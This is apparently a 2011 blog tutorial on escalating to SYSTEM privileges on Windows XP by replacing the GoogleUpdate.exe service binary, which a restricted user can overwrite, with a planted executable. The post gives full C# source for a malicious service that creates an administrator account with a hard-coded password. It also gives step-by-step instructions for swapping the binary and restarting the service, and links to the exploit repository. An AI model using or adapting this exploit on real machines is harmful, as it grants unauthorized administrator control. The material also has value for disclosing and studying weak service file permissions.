---
layout: blog-post
title: "Privilege escalation on Windows using Binary Planting"
excerpt: "Privilege escalation on Windows using Binary Planting"
disqus_id: /2011/09/23/privilegeescalation/
location: New Delhi, India
time: 11:00 PM
categories:
- Privilege Escalation
- Windows
---

This article is a tutorial on how to trick Windows XP into giving you system privileges using Binary Planting. There have been other previlege escalation methods which are no longer useable:

* [Escalation using at command] (http://h0bbel.p0ggel.org/windows-xp-privilege-escalation-exploit-no-it-isnt)
* [Escalation using Utilman.exe](http://technet.microsoft.com/en-us/security/bulletin/ms04-019)

Microsoft Windows services, formerly known as NT services, enable you to create long-running executable applications that run in their own Windows sessions. These services can be automatically started when the computer boots, can be paused and restarted, and do not show any user interface. Each service executes in the security context of a user account.

You can specify one of the following special accounts instead of specifying a user account for the service:

* [LocalService](http://msdn.microsoft.com/en-us/library/ms684188.aspx)
* [NetworkService](http://msdn.microsoft.com/en-us/library/ms684272.aspx)
* [LocalSystem](http://msdn.microsoft.com/en-us/library/ms684190.aspx)

LocalSystem has extensive privileges on the local computer, and acts as the computer on the network. Its token includes the NT AUTHORITY\SYSTEM and BUILTIN\Administrators SIDs; these accounts have access to most system objects. 

If you open *services.msc* you can see many Windows services running with **LocalSystem** account. Most of the Windows services run under the process svchost.exe by supplying different command line parameters to it. Now imagine what will happen if we replace svchost.exe with our own custom *svchost.exe* having malicious code. This file replacement will result in privelege escalation and execution of exploit code. This can even happen remotely if you are able to connect to remote machine and replace *svchost.exe*. Fortunately, *svchost.exe* and many of the Windows critical executables are protected by [Windows File Protection] (http://en.wikipedia.org/wiki/Windows_File_Protection)

![](/images/Blog/services.png)  

However, depending on your computer configuration, there will be some other 3rd party services which have been installed and run under the different process. For example, in the screenshot below there is a service called **Google Update service** which runs under LocalSystem account in the process **GoogleUpdate.exe**. This process is generally called from this location **C:\Program Files\Google\GoogleUpdate.exe**.

![](/images/Blog/gpupdate.png)  

Now, even as a restricted user, nobody is stopping me from deleting or replacing this file. If we replace this **GoogleUpdate.exe** with the malicious one and then restart the Google Update Services, no file integrity check is performed by OS or Google Update Services to verify that file being executed is original or malicious. This makes the system vulnerable to be exploited since we can run any malicious code under System account simply by replacing this file and then executing the service, which can be done as restricted user.

![](/images/Blog/gservice.png)  

Here is a simple Windows Service code which produces the executable called **GoogleUpdate.exe** , creates a user and adds it to the Administrators group.

{% highlight csharp %}
namespace Google.MakeAdmin.Exploit
{
    using System;
    using System.Diagnostics;
    using System.ServiceProcess;
    using System.DirectoryServices;

    public partial class MakeAdmin : ServiceBase
    {
        private readonly string sSource;
        private readonly string sLog;        

        /// <summary>
        /// Initializes a new instance of the <see cref="MakeAdmin"/> class.
        /// </summary>
        public MakeAdmin()
        {
            InitializeComponent();
            sSource = "Google.MakeAdmin.Exploit";
            sLog = "Application";
        }

        /// <summary>
        /// When implemented in a derived class, executes when a Start command is sent to the service by the 
        /// Service Control Manager (SCM) or when the operating system starts (for a service that starts automatically). 
        /// Specifies actions to take when the service starts.
        /// </summary>
        /// <param name="args">Data passed by the start command.</param>
        protected override void OnStart(string[] args)
        {
            if (!EventLog.SourceExists(sSource))
            {
                EventLog.CreateEventSource(sSource, sLog);
            }


            const string login = "superboy";
            const string password = "pass@word1";
            const string fullName = "Clark Kent";

            CreateUserAccount(login, password, fullName, true, true);

        }

        /// <summary>
        /// When implemented in a derived class, executes when a Stop command is sent to the service by the 
        /// Service Control Manager (SCM). Specifies actions to take when a service stops running.
        /// </summary>
        protected override void OnStop()
        {
        }

        /// <summary>
        /// Creates the user account.
        /// </summary>
        /// <param name="login">The login.</param>
        /// <param name="password">The password.</param>
        /// <param name="fullName">The full name.</param>
        /// <param name="isAdmin">if set to <c>true</c> [is admin].</param>
        /// <param name="isNew">if set to <c>true</c> [is new].</param>
        private void CreateUserAccount(string login, string password, string fullName, bool isAdmin, bool isNew)
        {
            try
            {
                DirectoryEntry dirEntry = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
                DirectoryEntries entries = dirEntry.Children;
                DirectoryEntry newUser = null;
                if (isNew)
                {
                    newUser = entries.Add(login, "user");
                }
                else
                {
                    newUser = entries.Find(login, "user");
                }

                newUser.Properties["FullName"].Add(fullName);
                newUser.Invoke("SetPassword", password);
                newUser.CommitChanges();

                // Remove the if condition along with the else to create user account in "user" group.
                DirectoryEntry grp;
                if (isAdmin)
                {
                    grp = dirEntry.Children.Find("Administrators", "group");
                    if (grp != null)
                    {
                        grp.Invoke("Add", new object[] {newUser.Path});
                    }
                }
                else
                {
                    grp = dirEntry.Children.Find("Guests", "group");
                    if (grp != null)
                    {
                        grp.Invoke("Add", new object[] {newUser.Path});
                    }
                }

            }
            catch (Exception ex)
            {
                EventLog.WriteEntry(sSource, ex.Message);
            }
        }
    }
}
{% endhighlight %}

##Exploiting the Service running with LocalSystem Account##

1. Compile the file to generate a new service executable named **GoogleUpdate.exe** and replace it with the original file stored at the location **C:\Program Files\Google\GoogleUpdate.exe**
2. Restart the service. This will cause our exploit code to be executed and a new user will be created in the system with Administrator privileges. In my example, user will have login name *superboy* and password *pass@word1*.
3. Try to run the command prompt with the credentials of new user.
![](/images/Blog/runcmd.png)

![](/images/Blog/login.png)

4. The command prompt executed is under the credentials of superboy and has superuser access.

The exploit code can be downloaded from [this](https://github.com/madhur/Google.MakeAdmin.Exploit) github repository.


